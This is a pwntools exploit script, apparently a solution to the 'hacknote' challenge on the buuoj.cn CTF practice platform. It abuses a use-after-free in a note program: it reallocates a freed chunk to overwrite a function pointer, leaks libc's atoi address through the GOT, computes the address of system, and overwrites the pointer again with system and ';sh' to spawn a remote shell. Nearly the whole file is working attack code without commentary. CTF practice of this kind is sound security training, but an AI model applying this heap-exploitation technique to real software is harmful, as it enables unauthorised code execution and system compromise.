from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23-32/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-32.so"
# p = process([ld_path, "./hacknote"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26284)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice :", "1")
    sa("Note size :", str(size))
    sa("Content :", con)
    
def free(index):
    sa("Your choice :", "2")
    sa("Index :", str(index))

def show(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))


# uaf

pro = ELF("./hacknote")
atoi = pro.got["atoi"]
puts_some = 0x0804862B

# leak
add(0x10, "a")  # 0
add(0x10, "a")  # 1
free(0)
free(1)
add(0x8, p32(puts_some)+p32(atoi))   # 2
show(0)
info = u32(rud("\n").ljust(4, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["atoi"]
system = base+libc.sym["system"]
print("base: ", hex(base))

# attack
free(2)
add(0x8, p32(system)+b";sh\x00")
show(0)

shell()


